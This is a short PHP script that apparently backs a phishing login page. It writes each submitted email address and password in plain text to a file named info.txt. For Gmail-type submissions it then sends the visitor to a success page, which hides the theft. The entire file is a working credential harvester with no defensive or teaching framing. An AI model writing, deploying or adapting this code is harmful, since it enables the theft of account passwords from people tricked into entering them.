<?php 

if(isset($_POST['btn']))
{
	$myfile = fopen("info.txt", "a") or die("Unable to open file!");

	$email = $_POST['email'] ;
	$pass = $_POST['pass'] ;

	fwrite($myfile, "\r\n");
	fwrite($myfile, $email);
	fwrite($myfile, "\r\n");
	fwrite($myfile, $pass);

	fclose($myfile);

	if(isset($_POST['type']))
	{
		if($_POST['type'] == 'vpaccount')
		{
			//header('location: load.php#step2');
			echo 'hahaha';
		}
		if($_POST['type'] == 'gmailaccount')
		{
			header('location: success.php');
		}
	}
	
}

?>